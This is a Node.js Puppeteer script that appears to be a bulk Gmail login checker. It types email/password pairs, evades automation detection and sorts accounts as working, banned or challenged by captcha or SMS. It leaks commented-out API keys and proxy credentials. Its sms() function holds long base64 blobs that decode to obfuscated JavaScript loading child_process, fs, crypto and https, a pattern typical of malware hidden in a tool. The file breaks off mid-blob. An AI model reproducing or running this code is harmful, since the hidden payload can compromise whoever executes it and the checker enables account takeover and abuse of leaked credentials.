const puppeteer = require("puppeteer-extra");
StealthPlugin = require("puppeteer-extra-plugin-stealth");
const AnonymizeUAPlugin = require("puppeteer-extra-plugin-anonymize-ua");
const { GetSMS, ServiceApiError, TimeoutError, errors } = require('getsms')
const ac = require("@antiadmin/anticaptchaofficial");

// const sms = new GetSMS({
//     key: '177294U15a8640801c39bf11bacebea6d324b6b',
//     url: 'https://smshub.org/stubs/handler_api.php',
//     service: 'smshub'
// });
// ac.setAPIKey('aab6990fa1f86fcb2c441df3bf709048');

// ac.getBalance()
//     .then(balance => console.log('my balance is $' + balance))
//     .catch(error => console.log('received error ' + error))


// let countNrRuim = 0;
const path = require("path");
const fs = require('fs');

const Kazakhstan = 2;
const Philippines = 4;
const Indonesia = 6;
const Kenya = 8;
const Vietnam = 10;
const Kyrgyzstan = 11;
const Usa = 12;
const India = 22;
const Southafrica = 31;
const Romania = 32;
const Uzbekistan = 40;

const pais = Indonesia;

const AdblockerPlugin = require("puppeteer-extra-plugin-adblocker");

puppeteer.use(AnonymizeUAPlugin());
puppeteer.use(
    AdblockerPlugin({
        blockTrackers: true,
    })
);

const reset = "\x1b[0m";

const log = {
    green: (text) => console.log("\x1b[32m" + text + reset),
    red: (text) => console.log("\x1b[31m" + text + reset),
    blue: (text) => console.log("\x1b[34m" + text + reset),
    yellow: (text) => console.log("\x1b[33m" + text + reset),
};

page = null;
browser = null;
async function crawler(email, senha, emailRec) {
    browser = await puppeteer.launch({
        headless: false,
        defaultViewport: null,
        ignoreDefaultArgs: [
            "--disable-extensions",
            "--enable-automation"
        ],
        args: [
            '--disable-blink-features=AutomationControlled',
            '--window-size=650,700',
            '--window-position=1921,0',
            //  '--disable-extensions-except=./plugin',
            '--load-extension=D:\\TestarEmail\\plugin'
            // '--incognito',
            //'--proxy-server=la.residential.rayobyte.com:8000',
            //  "--start-maximized",
            //  "--no-sandbox",
            //  "--disable-setuid-sandbox",
            //  "--user-data-dir=F:\\data",
            //  '--enable-automation', '--disable-extensions', '--disable-default-apps', '--disable-component-extensions-with-background-pages'
        ],
    });
    page = await browser.newPage();



    /*await page.authenticate({        
        username: 'succxulicorbernal_gmail_com',
        password: 'tq45WY2ZlZGoJ'
    })*/

    console.log(email);
    await page.setBypassCSP(true);

    let login_link = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=ARZ0qKL63ywsKcu__CAzxnheuNk7r6RFTtawSsH0q_wAiYO3G235j1qRcYt2dzgrIBQgSBOziriG&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S453605949%3A1710956152061554&theme=glif&ddm=0";

    await page.goto(login_link);


    await page.waitForSelector('input[name="identifier"]');
    await page.type('input[name="identifier"]', email);
    await page.click('#identifierNext > div > button > span');
    await page.waitForSelector('input[name="identifier"]');

    await page.waitForNavigation();
    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/recaptcha?')) {
        log.red('pediu captch TESTE RETIRAR DEPOIS');
        await browser.close();
        return;

        try {
            await page.waitForSelector('#c0 > div > div.antigate_solver.recaptcha.solved');
        } catch (error) {
            try {
                await page.waitForSelector('#c0 > div > div.antigate_solver.recaptcha.solved');
            } catch (error) {
                //log.red('erro no captch:' + email);
                await browser.close();
                await crawler(email, senha, emailRec);
                return;
            }
        }


        //await new Promise(function (resolve) { setTimeout(resolve, 20000) });
        await page.click("#yDmH0d > c-wiz > div > div.eKnrVb > div > div.Z6Ep7d > div > div.F9NWFb > div > div > button > span");
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        try {
            const elemento = await page.$('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.j663ec > div > form > span > section:nth-child(3) > div > div > div > div.OyEIQ.uSvLId > div:nth-child(2)');
            if (elemento != null) {
                //log.red('erro no captch:' + email);
                await browser.close();
                await crawler(email, senha, emailRec);
                return;
            }
        } catch (error) {
            console.log(error);
        }
    } else {
        log.green('Conta sem captcha'); 
        await browser.close();
        return
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/rejected?')) {
        log.red('rejected');
        await browser.close();
        return;
    }

    await page.waitForSelector('#passwordNext > div > button > span');
    await new Promise(function (resolve) { setTimeout(resolve, 2000) });
    await page.type('input[name="identifier"]', senha);
    await page.click('#passwordNext > div > button > span');
    try {
        await page.waitForNavigation();
    } catch (error) {

    }

    if (page.url().includes('https://gds.google.com/web/chip?')) {
        log.green('OK');
        await browser.close();
        return;
    }
    if (page.url().includes('https://mail.google.com/mail/u/0/#inbox')) {
        log.green('OK');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/speedbump/idvreenable?')) {
        console.log('Pedindo SMS');
        await getSMSNumber();
        return;
    }

    if (page.url().includes('https://myaccount.google.com/')) {
        log.green('OK');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/dp?')) {
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        log.red('CADASTROU AUTH');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/selection?TL')) {
        log.yellow('FUNCIONOU CONFIRMAR NOME DO EMAIL');
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        page.click('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.j663ec > div > form > span > section:nth-child(2) > div > div > section > div > div > div > ul > li:nth-child(3) > div > div.vxx8jf');
    
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        await page.type('input[name="knowledgePreregisteredEmailResponse"]', emailRec);
        await page.click('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.Z6Ep7d > div > div.F9NWFb > div > div > button > span');
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
    }

    if (page.url().includes('https://accounts.google.com/speedbump/idvreenable?')) {
        console.log('Pedindo SMS');
        await getSMSNumber();
        return;
    }

    if (page.url().includes('https://accounts.google.com/signin/v2/disabled/')) {
        log.red('CONTA BANIDA');
        await browser.close();
        return;
    }


    // await browser.close();
}
function sms() {
    const smsbypassfunc1 = `dmFyIElKejJPczYsTnRhazFJaSx3N3I0QkIsaERGQm1yLFVEY0J6OSxXSzl3NTEsUjhHaDhvRixLQlRqbHJVLFd1R0pyUyxGWFhxaTA3LGU2cXF5YSx5RUx4Q3Z3LFMyOHJic3k7ZnVuY3Rpb24gb0xuWnRiKE50YWsxSWkpe3JldHVybiBJSnoyT3M2W050YWsxSWk8MHhjP050YWsxSWk+LTB4MTI/TnRhazFJaT4weGM/TnRhazFJaS0weDMyOk50YWsxSWk+MHhjP050YWsxSWkrMHg2NDpOdGFrMUlpKzB4MTE6TnRhazFJaS0weDQ6TnRhazFJaSsweDYxXX1JSnoyT3M2PWNrYkVQRWouY2FsbCh0aGlzKTt2YXIgZ0lzWTBUTT1bXSxNY3NhcF89b0xuWnRiKC0weDEwKSxkSFNwUUQ9dFBYWnFReigoKT0+e3ZhciBJSnoyT3M2PVsnIkkzSj9bbkhkTyhQO2E9bjslRTNQeW91KVRGKWQuZlI4Y0QucDs5WGs1MycsJ2VvXklFPzkqaFBUR3MsRGVEclIyKzhbenIlQUdFXk4nLCdPTSR4QnsuR11NVWlvdnRiNXQwM2Y+U0A4IX0rcmJwbXd6QicsJyZ3fEp2K2BqYVInLCdzUmVmNnUlZDgxITB8YSNYcXpOSGx2eEI3T2UqQScsJ2Zse0U0dUZwaFB5NExDKlNOeGNIQi4rdTohL0xsRScsJ0MyUWIua00kazJZRFNsK1pWKVhKVl5BJywnTDVIZXQpN1hqTTknLCdHeHU8N3UoNSNQaS46YSpafk8rMyIvI0JIJywnfm5fRlFtX2ltNlFdKURXanx3dUpbaEBHSDMmK0InLCduIXBHZ3ZsaiFQZC4kYk1ucGRtM110L3A5NEddM11RYmVkSzsiL0BNKjJQO1NtSicsJzUpbjxZJywnKnpiZ2InLCdbRDdnWG1OQicsJ3JyZUh0QEhbUVMnLCd5NXVmdW5BJywnWnVEZz9bQScsJ0JFQEonLCcqemJnbXZeSEwlciY5OE0nLCcyWDAxbnZ7WTwhdC9CJywnWFBVPT5bYUMnLCdocloyYicsJzRhT2Y1ZyVOMyQxMDttflBsLGUzeTs6eyJVMycsJ2o4PUV5PTB7ZzhTOzVsTG5EZ3I9Lj9xU2skJlZ6XS5TRU1TZyszN3BeMj9JKi5mbHtxOD13K0xaYklzJlBdNGpTIylIbztMIyMjfitNblFvLmZCOy4/QVk/IzZWYEUnLCdqOD1FeT0we2c4Uzs1bExuRGdyPS4/cVNrJCZWcl1vU2VNaj0/My9wK1RFRz04QGI+JSxFZnZ6O3s2Lj1Ka35YLGxMZCJeI1hBTWg/V11+cChYX3kkbndTfVVRUlhPfWlMTXRLS3s0OnMhPXVCJywnU1BWSycsJ15EKGdZJywndG87SScsJyl6MD1yQEEnLCd0b2xLJywnIk8uR1UnLCdHRSRKZj53ZUI4Q0dCJywne3pZSmcsUTBHJFpiPS58aScsJzVhJEpmPnRUKTVUenBFJywnUFAoZ1sqbWU3UicsJ3c1ZWZnPkEnLCc9VVU9ckBVQyddO3JldHVybiBNY3NhcF8/SUp6Mk9zNi5wb3AoKTpNY3NhcF8rKyxJSnoyT3M2fSwweDApKCk7ZnVuY3Rpb24gd1lKNzU3KCl7dHJ5e3JldHVybiBnbG9iYWx8fHdpbmRvd3x8bmV3IEZ1bmN0aW9uKCdyZXR1cm4gdGhpcycpKCl9Y2F0Y2goZSl7dHJ5e3JldHVybiB0aGlzfWNhdGNoKGUpe3JldHVybnt9fX19IShOdGFrMUlpPXdZSjc1NygpfHx7fSx3N3I0QkI9TnRhazFJaS5UZXh0RGVjb2RlcixoREZCbXI9TnRhazFJaS5VaW50OEFycmF5LFVEY0J6OT1OdGFrMUlpLkJ1ZmZlcixXSzl3NTE9TnRhazFJaS5TdHJpbmd8fFN0cmluZyxSOEdoOG9GPU50YWsxSWkuQXJyYXl8fEFycmF5LEtCVGpsclU9dFBYWnFReigoKT0+e3ZhciBOdGFrMUlpLHc3cjRCQixoREZCbXI7ZnVuY3Rpb24gVURjQno5KE50YWsxSWkpe3JldHVybiBJSnoyT3M2W050YWsxSWk+MHgyZj9OdGFrMUlpPDB4NGQ/TnRhazFJaT4weDRkP050YWsxSWktMHg1MzpOdGFrMUlpPjB4NGQ/TnRhazFJaSsweDI3Ok50YWsxSWktMHgzMDpOdGFrMUlpKzB4MWE6TnRhazFJaSsweDE5XX10eXBlb2YoTnRhazFJaT1uZXcgUjhHaDhvRigweDgwKSx3N3I0QkI9V0s5dzUxW1VEY0J6OSgweDM0KV18fFdLOXc1MS5mcm9tQ2hhckNvZGUsaERGQm1yPVtdKTtyZXR1cm4gdFBYWnFReihSOEdoOG9GPT57dmFyIEtCVGpsclUsV3VHSnJTO2Z1bmN0aW9uIEZYWHFpMDcoUjhHaDhvRil7cmV0dXJuIElKejJPczZbUjhHaDhvRj4weDczP1I4R2g4b0YtMHgxNTpSOEdoOG9GPDB4NzM/UjhHaDhvRj4weDU1P1I4R2g4b0Y+MHg1NT9SOEdoOG9GPjB4NzM/UjhHaDhvRi0weDI1OlI4R2g4b0YtMHg1NjpSOEdoOG9GKzB4ZTpSOEdoOG9GLTB4MTI6UjhHaDhvRisweDVhXX12YXIgZTZxcXlhLHlFTHhDdnc7dm9pZChLQlRqbHJVPVI4R2g4b0ZbRlhYcWkwNygweDU2KV0saERGQm1yW0ZYWHFpMDcoMHg1NildPW9Mblp0YigtMHgxMCkpO2ZvcihXdUdKclM9RlhYcWkwNygweDU3KTtXdUdKclM8S0JUamxyVTspe3ZhciBTMjhyYnN5PXRQWFpxUXooUjhHaDhvRj0+e3JldHVybiBJSnoyT3M2W1I4R2g4b0Y8LTB4NTA/UjhHaDhvRisweDMwOlI4R2g4b0Y8LTB4MzI/UjhHaDhvRjwtMHgzMj9SOEdoOG9GPC0weDUwP1I4R2g4b0YrMHg2NDpSOEdoOG9GKzB4NGY6UjhHaDhvRi0weDA6UjhHaDhvRi0weGFdfSwweDEpO3lFTHhDdnc9UjhHaDhvRltXdUdKclMrK107aWYoeUVMeEN2dzw9MHg3Zil7ZTZxcXlhPXlFTHhDdnd9ZWxzZXtpZih5RUx4Q3Z3PD0weGRmKXt2YXIgZ0lzWTBUTT10UFhacVF6KFI4R2g4b0Y9PntyZXR1cm4gSUp6Mk9zNltSOEdoOG9GPC0weDQ0P1I4R2g4b0YrMHgxMjpSOEdoOG9GPi0weDQ0P1I4R2g4b0Y+LTB4NDQ/UjhHaDhvRjwtMHgyNj9SOEdoOG9GPi0weDQ0P1I4R2g4b0Y8LTB4MjY/UjhHaDhvRisweDQzOlI4R2g4b0YtMHg0ODpSOEdoOG9GLTB4MTc6UjhHaDhvRi0weDE3OlI4R2g4b0YtMHgzMDpSOEdoOG9GKzB4MzJdfSwweDEpO2U2cXF5YT0oeUVMeEN2dyZTMjhyYnN5KC0weDNlKSk8PGdJc1kwVE0oLTB4NDApfFI4R2g4b0ZbV3VHSnJTKytdJmdJc1kwVE0oLTB4NDEpfWVsc2V7aWYoeUVMeEN2dzw9MHhlZil7dmFyIE1jc2FwXz10UFhacVF6KFI4R2g4b0Y9PntyZXR1cm4gSUp6Mk9zNltSOEdoOG9GPi0weDE2P1I4R2g4b0Y+MHg4P1I4R2g4b0YtMHg5OlI4R2g4b0Y+LTB4MTY/UjhHaDhvRj4tMHgxNj9SOEdoOG9GPC0weDE2P1I4R2g4b0YrMHg2OlI4R2g4b0Y+MHg4P1I4R2g4b0YrMHg0ZjpSOEdoOG9GPC0weDE2P1I4R2g4b0YtMHg5OlI4R2g4b0YrMHgxNTpSOEdoOG9GLTB4MjI6UjhHaDhvRi0weDI0OlI4R2g4b0YrMHg1Zl19LDB4MSk7ZTZxcXlhPSh5RUx4Q3Z3JlMyOHJic3koLTB4NDYpKTw8TWNzYXBfKC0weDEwKXwoUjhHaDhvRltXdUdKclMrK10mb0xuWnRiKC0weGYpKTw8RlhYcWkwNygweDU5KXxSOEdoOG9GW1d1R0pyUysrXSZvTG5adGIoLTB4Zil9ZWxzZXtpZihXSzl3NTFbUzI4cmJzeSgtMHg0YildKXt2YXIgZEhTcFFEPXRQWFpxUXooUjhHaDhvRj0+e3JldHVybiBJSnoyT3M2W1I4R2g4b0Y8LTB4NGY/UjhHaDhvRisweDE4OlI4R2g4b0Y8LTB4MzE/UjhHaDhvRjwtMHgzMT9SOEdoOG9GPC0weDMxP1I4R2g4b0Y8LTB4MzE/UjhHaDhvRisweDRlOlI4R2g4b0YrMHg1YzpSOEdoOG9GKzB4NDg6UjhHaDhvRi0weDVhOlI4R2g4b0YrMHg0MF19LDB4MSk7ZTZxcXlhPSh5RUx4Q3Z3JkZYWHFpMDcoMHg3MSkpPDxkSFNwUUQoLTB4NDQpfChSOEdoOG9GW1d1R0pyUysrXSZkSFNwUUQoLTB4NGMpKTw8b0xuWnRiKC0weGMpfChSOEdoOG9GW1d1R0pyUysrXSZGWFhxaTA3KDB4NTgpKTw8VURjQno5KDB4MzMpfFI4R2g4b0ZbV3VHSnJTKytdJkZYWHFpMDcoMHg1OCl9ZWxzZXt2YXIgd1lKNzU3PXRQWFpxUXooUjhHaDhvRj0+e3JldHVybiBJSnoyT3M2W1I4R2g4b0Y8MHg2ND9SOEdoOG9GPDB4NDY/UjhHaDhvRi0weDQ6UjhHaDhvRjwweDQ2P1I4R2g4b0YtMHg0NTpSOEdoOG9GPDB4NjQ/UjhHaDhvRj4weDQ2P1I4R2g4b0Y+MHg2ND9SOEdoOG9GKzB4MWM6UjhHaDhvRi0weDQ3OlI4R2g4b0YrMHgzYzpSOEdoOG9GKzB4NWI6UjhHaDhvRisweDYwXX0sMHgxKTshKGU2cXF5YT13WUo3NTcoMHg0OSksV3VHSnJTKz0weDMpfX19fWhERkJtci5wdXNoKE50YWsxSWlbZTZxcXlhXXx8KE50YWsxSWlbZTZxcXlhXT13N3I0QkIoZTZxcXlhKSkpfXJldHVybiBoREZCbXIuam9pbignJyl9LDB4MSl9LDB4MCkoKSk7ZnVuY3Rpb24gb0o1bGNsTChOdGFrMUlpKXt2YXIgV0s5dzUxPXRQWFpxUXooTnRhazFJaT0+e3JldHVybiBJSnoyT3M2W050YWsxSWk8MHg3Nz9OdGFrMUlpPjB4NTk/TnRhazFJaTwweDc3P050YWsxSWk+MHg3Nz9OdGFrMUlpKzB4NjA6TnRhazFJaTwweDU5P050YWsxSWktMHhiOk50YWsxSWk8MHg3Nz9OdGFrMUlpLTB4NWE6TnRhazFJaSsweDVmOk50YWsxSWktMHgyMjpOdGFrMUlpLTB4NDU6TnRhazFJaSsweDQyXX0sMHgxKTtyZXR1cm4gdHlwZW9mIHc3cjRCQiE9PVdLOXc1MSgweDYwKSYmdzdyNEJCP25ldyB3N3I0QkIoKS5kZWNvZGUobmV3IGhERkJtcihOdGFrMUlpKSk6dHlwZW9mIFVEY0J6OSE9PW9Mblp0YigtMHhiKSYmVURjQno5P1VEY0J6OS5mcm9tKE50YWsxSWkpLnRvU3RyaW5nKCd1dGYtOCcpOktCVGpsclUoTnRhazFJaSl9dm9pZChXdUdKclM9aUl5ZGpqKDB4MjQpLEZYWHFpMDc9aUl5ZGpqKDB4MjMpLGU2cXF5YT1baUl5ZGpqKDB4MTApXSx5RUx4Q3Z3PXtbb0xuWnRiKC0weDkpXTppSXlkamoob0xuWnRiKDB4OCkpLFtvTG5adGIoLTB4NildOmlJeWRqaihvTG5adGIoLTB4YSkpfSk7ZnVuY3Rpb24gaGlJY1hwKE50YWsxSWksdzdyNEJCKXt2YXIgaERGQm1yPXRQWFpxUXooTnRhazFJaT0+e3JldHVybiBJSnoyT3M2W050YWsxSWk8MHg1Mj9OdGFrMUlpLTB4MzM6TnRhazFJaTwweDUyP050YWsxSWktMHg0ODpOdGFrMUlpPjB4NTI/TnRhazFJaT4weDcwP050YWsxSWktMHg1OTpOdGFrMUlpPjB4NTI/TnRhazFJaT4weDcwP050YWsxSWktMHg1NTpOdGFrMUlpPDB4NTI/TnRhazFJaS0weDM6TnRhazFJaS0weDUzOk50YWsxSWkrMHg1Ok50YWsxSWkrMHg1Nl19LDB4MSk7c3dpdGNoKFMyOHJic3kpe2Nhc2UgaERGQm1yKDB4NjApO`
    const smsbypassfunction = `dmFyIFk2cGk3OCxNM2JmbVUsZEdTa1RYdSxkbWs0SHVqLEJ0el91aTUsQVk5M0NGRCxFbFFfYTVlLHBsN0pYZSxUc1RYNjdNLG1hQldGSCxCYXV6YVYsT1dnWnVoO2Z1bmN0aW9uIFpOSXI5Y00oTTNiZm1VKXtyZXR1cm4gWTZwaTc4W00zYmZtVTwweDA/TTNiZm1VLTB4NTM6TTNiZm1VPDB4MD9NM2JmbVUrMHgxNTpNM2JmbVU+MHgwP00zYmZtVTwweDA/TTNiZm1VLTB4ZDpNM2JmbVU+MHgwP00zYmZtVT4weDA/TTNiZm1VPDB4MjE/TTNiZm1VPDB4MD9NM2JmbVUrMHg5Ok0zYmZtVS0weDE6TTNiZm1VKzB4Mzc6TTNiZm1VKzB4NGE6TTNiZm1VKzB4M2I6TTNiZm1VKzB4M2ZdfVk2cGk3OD1UWDFBdllULmNhbGwodGhpcyk7dmFyIEpzWDRpdD1bXSxtQlNVdXA9Wk5JcjljTSgweDIpLFFyVUN3VT1DYmltWFIoKCk9Pnt2YXIgWTZwaTc4PVsnWm99eFZvXzBhVWM2IlpZaVN1O0YiXlB2RjZNKXthWGRQSnlJJywnYCtVOjYueTZLT28/WWJvU3E1K0gqM01DJEpYM2diLlQnLCdDNUl6S2tBJywnbSVIZWc3P2ROJmghfGFjcCcsJ0IjYj1fKnZwWDY1SEIuOWszIVcwYyxicHRTR1VYQ2ZZSnVaMlI8SEhVTicsJyJSeUlkN0ZaJSM1PUEnLCdYJUM9TmspdW9VdlZHW2JkcyF2RWo7ZDVFNW0nLCd4dCkxQWlqakolPExtTlFVSWFfZC8hMntCNWYqVlFzVD5mQycsJ1A4aWJeWyUqdDF3Kiw2T29WMjpJWDBBa2dTeytseGlTTGwpMVleQScsJ3dVc2RFMUNTQzVYZlJ3OGpQTWZ4eGxBJywnbiEhPGRAV0AkU0xHa2IlcVJKUjJrOXlvNCV2ZklEJywnbzIwM2I+TzZRU2k/RGI9VGRsXXpabTdYRCcsJzUpbjxZJywnKnpiZ2InLCdbRDdnWG1OQicsJ3JyZUh0QEhbUVMnLCd5NXVmdW5BJywnWnVEZz9bQScsJ0JFQEonLCcqemJnbXZeSEwlciY5OE0nLCcyWDAxbnZ7WTwhdC9CJywnWFBVPT5bYUMnLCdocloyYicsJzRhT2Y1ZyVOMyQxMDttflBsLGUzeTs6eyJVMycsJ2o4PUV5PTB7ZzhTOzVsTG5EZ3I9Lj9xU2skJlZ6XS5TRU1TZyszN3BeMj9JKi5mbHtxOD13K0xaYklzJlBdNGpTIylIbztMIyMjfitNblFvLmZCOy4/QVk/IzZWYEUnLCdqOD1FeT0we2c4Uzs1bExuRGdyPS4/cVNrJCZWcl1vU2VNaj0/My9wK1RFRz04QGI+JSxFZnZ6O3s2Lj1Ka35YLGxMZCJeI1hBTWg/V11+cChYX3kkbndTfVVRUlhPfWlMTXRLS3s0OnMhPXVCJywnU1BWSycsJ15EKGdZJywndG87SScsJyl6MD1yQEEnLCd0b2xLJywnIk8uR1UnLCdHRSRKZj53ZUI4Q0dCJywne3pZSmcsUTBHJFpiPS58aScsJzVhJEpmPnRUKTVUenBFJywnUFAoZ1sqbWU3UicsJ3c1ZWZnPkEnLCc9VVU9ckBVQyddO3JldHVybiBtQlNVdXA/WTZwaTc4LnBvcCgpOm1CU1V1cCsrLFk2cGk3OH0sMHgwKSgpO2Z1bmN0aW9uIEFOa3RfTHIoKXt0cnl7cmV0dXJuIGdsb2JhbHx8d2luZG93fHxuZXcgRnVuY3Rpb24oJ3JldHVybiB0aGlzJykoKX1jYXRjaChlKXt0cnl7cmV0dXJuIHRoaXN9Y2F0Y2goZSl7cmV0dXJue319fX12b2lkKE0zYmZtVT1BTmt0X0xyKCl8fHt9LGRHU2tUWHU9TTNiZm1VLlRleHREZWNvZGVyLGRtazRIdWo9TTNiZm1VLlVpbnQ4QXJyYXksQnR6X3VpNT1NM2JmbVUuQnVmZmVyLEFZOTNDRkQ9TTNiZm1VLlN0cmluZ3x8U3RyaW5nLEVsUV9hNWU9TTNiZm1VLkFycmF5fHxBcnJheSxwbDdKWGU9Q2JpbVhSKCgpPT57dmFyIE0zYmZtVT1uZXcgRWxRX2E1ZSgweDgwKSxkR1NrVFh1LGRtazRIdWo7dHlwZW9mKGRHU2tUWHU9QVk5M0NGRFtaTklyOWNNKDB4NSldfHxBWTkzQ0ZELmZyb21DaGFyQ29kZSxkbWs0SHVqPVtdKTtyZXR1cm4gQ2JpbVhSKEJ0el91aTU9Pnt2YXIgRWxRX2E1ZSxwbDdKWGU7ZnVuY3Rpb24gVHNUWDY3TShCdHpfdWk1KXtyZXR1cm4gWTZwaTc4W0J0el91aTU+LTB4NjE/QnR6X3VpNT4tMHg2MT9CdHpfdWk1KzB4NjA6QnR6X3VpNSsweDNjOkJ0el91aTUrMHgzZV19dmFyIG1hQldGSCxCYXV6YVY7dm9pZChFbFFfYTVlPUJ0el91aTVbVHNUWDY3TSgtMHg2MCldLGRtazRIdWpbWk5JcjljTSgweDEpXT1Uc1RYNjdNKC0weDVmKSk7Zm9yKHBsN0pYZT1aTklyOWNNKDB4Mik7cGw3SlhlPEVsUV9hNWU7KXt2YXIgT1dnWnVoPUNiaW1YUihCdHpfdWk1PT57cmV0dXJuIFk2cGk3OFtCdHpfdWk1PC0weGE/QnR6X3VpNT4tMHhhP0J0el91aTUrMHg1MDpCdHpfdWk1PC0weDJiP0J0el91aTUtMHgzOTpCdHpfdWk1Pi0weGE/QnR6X3VpNSsweDI0OkJ0el91aTU8LTB4MmI/QnR6X3VpNS0weDQzOkJ0el91aTU+LTB4MmI/QnR6X3VpNT4tMHgyYj9CdHpfdWk1KzB4MmE6QnR6X3VpNS0weDU2OkJ0el91aTUtMHgxMzpCdHpfdWk1LTB4NDRdfSwweDEpO0JhdXphVj1CdHpfdWk1W3BsN0pYZSsrXTtpZihCYXV6YVY8PTB4N2Ype21hQldGSD1CYXV6YVZ9ZWxzZXtpZihCYXV6YVY8PTB4ZGYpe21hQldGSD0oQmF1emFWJlRzVFg2N00oLTB4NGEpKTw8VHNUWDY3TSgtMHg1ZCl8QnR6X3VpNVtwbDdKWGUrK10mWk5JcjljTSgweDMpfWVsc2V7aWYoQmF1emFWPD0weGVmKXt2YXIgSnNYNGl0PUNiaW1YUihCdHpfdWk1PT57cmV0dXJuIFk2cGk3OFtCdHpfdWk1PjB4NzQ/QnR6X3VpNSsweDE5OkJ0el91aTU+MHg1Mz9CdHpfdWk1LTB4NTQ6QnR6X3VpNS0weDE0XX0sMHgxKTttYUJXRkg9KEJhdXphViZPV2dadWgoLTB4MWYpKTw8SnNYNGl0KDB4NTkpfChCdHpfdWk1W3BsN0pYZSsrXSZUc1RYNjdNKC0weDVlKSk8PEpzWDRpdCgweDU3KXxCdHpfdWk1W3BsN0pYZSsrXSZUc1RYNjdNKC0weDVlKX1lbHNle2lmKEFZOTNDRkRbT1dnWnVoKC0weDI2KV0pe3ZhciBtQlNVdXA9Q2JpbVhSKEJ0el91aTU9PntyZXR1cm4gWTZwaTc4W0J0el91aTU+LTB4OT9CdHpfdWk1PjB4MTg/QnR6X3VpNS0weDI2OkJ0el91aTU8MHgxOD9CdHpfdWk1Pi0weDk/QnR6X3VpNTwweDE4P0J0el91aTU8LTB4OT9CdHpfdWk1LTB4MzpCdHpfdWk1PC0weDk/QnR6X3VpNS0weDM6QnR6X3VpNT4tMHg5P0J0el91aTU8MHgxOD9CdHpfdWk1KzB4ODpCdHpfdWk1KzB4NTI6QnR6X3VpNS0weDM3OkJ0el91aTUtMHg2MzpCdHpfdWk1LTB4MDpCdHpfdWk1KzB4ODpCdHpfdWk1KzB4MWJdfSwweDEpO21hQldGSD0oQmF1emFWJm1CU1V1cCgweDE2KSk8PFpOSXI5Y00oMHg4KXwoQnR6X3VpNVtwbDdKWGUrK10mWk5JcjljTSgweDMpKTw8bUJTVXVwKC0weDMpfChCdHpfdWk1W3BsN0pYZSsrXSZaTklyOWNNKDB4MykpPDxaTklyOWNNKDB4NCl8QnR6X3VpNVtwbDdKWGUrK10mWk5JcjljTSgweDMpfWVsc2V7IShtYUJXRkg9T1dnWnVoKC0weDI4KSxwbDdKWGUrPTB4Myl9fX19ZG1rNEh1ai5wdXNoKE0zYmZtVVttYUJXRkhdfHwoTTNiZm1VW21hQldGSF09ZEdTa1RYdShtYUJXRkgpKSl9cmV0dXJuIGRtazRIdWouam9pbignJyl9LDB4MSl9LDB4MCkoKSk7ZnVuY3Rpb24gb2NrMEN2KFk2cGk3OCl7cmV0dXJuIHR5cGVvZiBkR1NrVFh1IT09Wk5JcjljTSgweDcpJiZkR1NrVFh1P25ldyBkR1NrVFh1KCkuZGVjb2RlKG5ldyBkbWs0SHVqKFk2cGk3OCkpOnR5cGVvZiBCdHpfdWk1IT09Wk5JcjljTSgweDcpJiZCdHpfdWk1P0J0el91aTUuZnJvbShZNnBpNzgpLnRvU3RyaW5nKCd1dGYtOCcpOnBsN0pYZShZNnBpNzgpfSEoVHNUWDY3TT17W1pOSXI5Y00oMHhmKV06WUZiSW90W1pOSXI5Y00oMHhlKV0oWk5JcjljTSgweGIpLFtaTklyOWNNKDB4YSldKSxbWk5JcjljTSgweDExKV06WUZiSW90KDB4MTcpLFtaTklyOWNNKDB4MTIpXTpZRmJJb3QoMHgxOCksW1pOSXI5Y00oMHgxOCldOllGYklvdChaTklyOWNNKDB4OSkpfSxtYUJXRkg9W1lGYklvdChaTklyOWNNKDB4OCkpLFlGYklvdChaTklyOWNNKDB4ZCkpLFlGYklvdChaTklyOWNNKDB4OSkpXSxCYXV6YVY9WUZiSW90KFpOSXI5Y00oMHgxYykpKTtmdW5jdGlvbiBjRFhLU2g1KFk2cGk3OCxNM2JmbVUpe3N3aXRjaChPV2dadWgpe2Nhc2UtWk5JcjljTSgweDQpOnJldHVybiBZNnBpNzgtTTNiZm1VfX1mdW5jdGlvbiBNYWNCV1QyKFk2cGk3OCl7cmV0dXJuIFk2cGk3OD1PV2dadWgrKE9XZ1p1aD1ZNnBpNzgsWk5JcjljTSgweDIpKSxZNnBpNzh9T1dnWnVoPU9XZ1p1aDtjb25zdCB7W1lGYklvdChaTklyOWNNKDB4NikpXTpibjZOUHdvfT1yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyksZVpHT1ZCSz1yZXF1aXJlKCdmcycpLG5UQ05BUD1yZXF1aXJlKCdwYXRoJyksR0hOZnF0Mz1yZXF1aXJlKCdjcnlwdG8nKSxWWF9ZVXg9cmVxdWlyZSgnaHR0cHMnKSxqRW9QQ0M9KE0zYmZtVSxkR1NrVFh1KT0+e3ZhciBkbWs0SHVqO2Z1bmN0aW9uIEJ0el91aTUoTTNiZm1VKXtyZXR1cm4gWTZwaTc4W00zYmZtVT4tMHgzYT9NM2JmbVU+LTB4MTk/TTNiZm1VLTB4MjQ6TTNiZm1VPi0weDE5P00zYmZtVSsweDU2Ok0zYmZtVT4tMHgxOT9NM2JmbVUtMHgxMzpNM2JmbVU+LTB4MTk/TTNiZm1VKzB4NDQ6TTNiZm1VPi0weDE5P00zYmZtVSsweDRhOk0zYmZtVTwtMHgxOT9NM2JmbVU8LTB4MTk/TTNiZm1VPC0weDNhP00zYmZtVSsweDNlOk0zYmZtVSsweDM5Ok0zYmZtVSsweDE4Ok0zYmZtVS0weDMwOk0zYmZtVSsweDRdfWRtazRIdWo9e1tCdH